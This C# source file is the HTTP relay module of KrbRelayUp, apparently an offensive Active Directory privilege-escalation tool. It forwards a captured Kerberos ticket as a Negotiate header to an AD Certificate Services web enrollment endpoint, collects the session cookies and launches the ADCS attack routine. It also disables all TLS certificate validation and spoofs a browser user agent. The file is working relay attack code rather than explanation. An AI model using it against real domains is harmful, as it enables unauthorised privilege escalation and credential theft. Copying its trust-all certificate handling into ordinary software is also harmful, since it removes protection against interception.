using System;
using System.Runtime.InteropServices;
using static KrbRelayUp.Relay.Natives;
using static KrbRelayUp.Relay.Relay;
using System.DirectoryServices.Protocols;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.IO;
using System.Text;

namespace KrbRelayUp.Relay
{
    public class Http
    {
        public static HttpClient httpClient = new HttpClient();
        public static string cookie;
        public static string cookies;

        public static void Relay()
        {
            HttpWebResponse result;
            cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));
            result = SendWebRequest($"{ ((Options.https) ? "https://" : "http://")}{ Options.caEndpoint}/certsrv", "GET", "", "Authorization", cookie);

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");

                // get our cookie
                for (int i = 0; i < result.Headers.Count; i++)
                {
                    if (result.Headers.GetKey(i) == "Set-Cookie")
                    {
                        cookies = result.Headers.Get(i).ToString();
                    }
                }

                try
                {
                    var dataStream = result.GetResponseStream();

                    var reader = new StreamReader(dataStream);
                    string responseFromServer = reader.ReadToEnd();
                    
                    if (Options.relayAttackType == RelayAttackType.ADCS)
                    {
                        Attacks.Http.ADCS.attack();
                    }
                    
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

            }
            
            else
            {
                for (int i = 0; i < result.Headers.Count; i++)
                {
                    if (result.Headers.GetKey(i) == "WWW-Authenticate")
                    {
                        Console.WriteLine($"[+] Got Krb Auth from NT/System. Relaying to ADCS now...");
                        apRep1 = Convert.FromBase64String(result.Headers.Get(i).ToString().Split(' ').Last());
                    }
                }
                
            }
            
        }

        public static HttpWebResponse SendWebRequest(string url, string method, string payload, string auth_header, string header_val)
        {
            InitiateSSLTrust();
            HttpWebRequest HttpReq = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse HttpResp = null;

            try
            {
                HttpReq.Method = method;
                HttpReq.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";

                if (method == "POST")
                {
                    HttpReq.ContentType = "application/x-www-form-urlencoded";
                    HttpReq.ContentLength = payload.Length;
                }


                if (auth_header.Length != 0)
                {
                    HttpReq.Headers.Add(auth_header, header_val);
                }

                if (method == "POST")
                {
                    byte[] payload_bytes = Encoding.UTF8.GetBytes(payload);

                    Stream ReqStream = HttpReq.GetRequestStream();
                    ReqStream.Write(payload_bytes, 0, payload_bytes.Length);
                    ReqStream.Close();
                }

                HttpResp = (HttpWebResponse)HttpReq.GetResponse();
            }
            catch (WebException e)
            {
                HttpResp = (HttpWebResponse)e.Response;
            }

            return HttpResp;
        }

        public static void InitiateSSLTrust()
        {
            try
            {
                //Change SSL checks so that all checks pass
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

    }

    


    internal class TrustAll : System.Net.ICertificatePolicy
    {
        public TrustAll() { }

        public bool CheckValidationResult(
            ServicePoint srvPoint,
            X509Certificate certificate,
            WebRequest request,
            int certificateProblem
        )
        {
            return true;
        }

    }
}
